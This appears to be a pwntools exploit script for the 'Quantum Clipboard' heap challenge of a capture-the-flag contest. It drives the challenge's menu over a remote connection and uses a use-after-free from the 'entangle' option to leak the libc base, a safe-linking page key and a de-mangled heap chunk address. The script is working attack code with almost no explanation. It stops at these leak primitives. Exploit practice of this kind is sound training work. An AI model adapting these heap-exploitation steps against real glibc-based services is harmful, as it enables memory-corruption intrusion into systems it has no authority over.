from pwn import *


ROOT = r"F:\CTF\CTF赛事与题目\CTF-wp\国际赛事\THEMCTF\PWN\Quantum Clipboard\quantum_clipboard\distribution"
LIBC_PATH = ROOT + r"\libc.so.6"
LD_PATH = "/mnt/f/CTF/CTF赛事与题目/CTF-wp/国际赛事/THEMCTF/PWN/Quantum Clipboard/quantum_clipboard/distribution/ld-linux-x86-64.so.2"
BIN_PATH = "/mnt/f/CTF/CTF赛事与题目/CTF-wp/国际赛事/THEMCTF/PWN/Quantum Clipboard/quantum_clipboard/distribution/one_more_pwn"
LIB_DIR = "/mnt/f/CTF/CTF赛事与题目/CTF-wp/国际赛事/THEMCTF/PWN/Quantum Clipboard/quantum_clipboard/distribution"

HOST = "13.238.150.105"
PORT = 36769

MENU_END = (
    b"\n=== The Quantum Clipboard ===\n"
    b"1. store fragment\n"
    b"2. show fragment\n"
    b"3. edit fragment\n"
    b"4. erase fragment\n"
    b"5. entangle slots\n"
    b"6. quit\n> "
)

UNSORTED_LEAK_OFF = 0x21ACE0

libc = ELF(LIBC_PATH, checksec=False)
context.binary = ELF(ROOT + r"\one_more_pwn", checksec=False)
context.log_level = "info"
context.timeout = 3


def start():
    mode = args.MODE or "remote"
    if mode == "local":
        return process(
            [
                "wsl",
                "bash",
                "-lc",
                f"'{LD_PATH}' --library-path '{LIB_DIR}' '{BIN_PATH}'",
            ]
        )
    if mode == "docker":
        return remote("127.0.0.1", PORT)
    return remote(HOST, PORT)


def unprotect(value: int) -> int:
    x = value
    for shift in (12, 24, 48):
        x ^= x >> shift
    return x


class QuantumClipboard:
    def __init__(self, io):
        self.io = io

    def choose(self, choice: int):
        self.io.sendlineafter(b"> ", str(choice).encode())

    def store(self, slot: int, size: int, data: bytes):
        assert len(data) == size
        self.choose(1)
        self.io.sendlineafter(b"slot> ", str(slot).encode())
        self.io.sendlineafter(b"size> ", str(size).encode())
        self.io.sendafter(b"data> ", data)

    def show(self, slot: int) -> bytes:
        self.choose(2)
        self.io.sendlineafter(b"slot> ", str(slot).encode())
        self.io.recvuntil(b"[*] fragment: ")
        return self.io.recvuntil(MENU_END, drop=True)[:-1]

    def edit(self, slot: int, data: bytes):
        self.choose(3)
        self.io.sendlineafter(b"slot> ", str(slot).encode())
        self.io.sendafter(b"data> ", data)

    def erase(self, slot: int):
        self.choose(4)
        self.io.sendlineafter(b"slot> ", str(slot).encode())

    def entangle(self, src: int, dst: int):
        self.choose(5)
        self.io.sendlineafter(b"source slot> ", str(src).encode())
        self.io.sendlineafter(b"entangle into slot> ", str(dst).encode())

    def quit(self):
        self.choose(6)


def leak_libc(qc: QuantumClipboard) -> int:
    qc.store(0, 0x500, b"A" * 0x500)
    qc.store(1, 0x20, b"B" * 0x20)
    qc.entangle(0, 2)
    qc.erase(0)
    leak = u64(qc.show(2)[:8].ljust(8, b"\x00"))
    libc_base = leak - UNSORTED_LEAK_OFF
    log.info("libc base = %#x", libc_base)
    return libc_base


def setup_precise_dup(qc: QuantumClipboard, slot_a: int, slot_b: int, size: int) -> int:
    qc.store(slot_a, size, b"A" * size)
    qc.entangle(slot_a, slot_b)
    qc.erase(slot_a)
    page_key = u64(qc.show(slot_b)[:8].ljust(8, b"\x00"))
    qc.edit(slot_b, p64(0) + p64(0) + b"B" * max(0, size - 16))
    qc.erase(slot_b)
    log.info("safe-link page key for size %#x = %#x", size, page_key)
    return page_key


def leak_exact_chunk(qc: QuantumClipboard, slot_a: int, slot_b: int, slot_c: int, size: int) -> int:
    qc.store(slot_a, size, b"C" * size)
    qc.entangle(slot_a, slot_b)
    qc.entangle(slot_a, slot_c)
    qc.erase(slot_a)
    qc.edit(slot_b, p64(0) + p64(0) + b"D" * max(0, size - 16))
    qc.erase(slot_b)
    encoded = u64(qc.show(slot_c)[:8].ljust(8, b"\x00"))
    chunk = unprotect(encoded)
    log.info("exact chunk for size %#x = %#x", size, chunk)
    return chunk


def leak_primitives():
    io = start()
    qc = QuantumClipboard(io)
    libc_base = leak_libc(qc)
    key16 = setup_precise_dup(qc, 3, 4, 16)
    heap_chunk = leak_exact_chunk(qc, 5, 6, 7, 0x400)
    log.info(
        "summary: libc=%#x key16=%#x heap_chunk=%#x",
        libc_base,
        key16,
        heap_chunk,
    )
    io.close()


if __name__ == "__main__":
    leak_primitives()
